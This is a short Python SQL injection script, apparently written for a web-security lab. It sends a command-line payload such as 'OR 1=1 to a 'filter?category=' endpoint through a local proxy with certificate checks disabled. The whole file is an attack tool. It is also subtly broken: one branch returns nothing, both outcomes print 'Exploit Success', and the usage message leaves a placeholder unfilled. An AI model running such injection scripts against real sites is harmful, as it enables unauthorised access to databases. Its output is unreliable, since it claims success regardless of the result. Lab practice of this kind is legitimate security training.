import requests
import urllib3
import sys
import re

proxies = {'http' : 'http://127.0.0.1' ,
			'https' : 'https://127.0.0.1'	}


def sqli_exp(url,payload):
	uri = "filter?category="
	r = requests.get(url+uri+payload, verify = False, proxies = proxies)
	if "Cat Gri" in r.text:
		return True
	else:
		False



if __name__ == "__main__":
	try:
		url = sys.argv[1].strip()
		payload = sys.argv[2].strip()
	except:
		print("[-] Syntax Error , Format : %s <url> <payload>" )
		print("Example : sql_inj_1.py example.com 'OR 1=1 ")

	if sqli_exp(url,payload):
		print("[+] Exploit Success")
	else:
		print("[+] Exploit Success")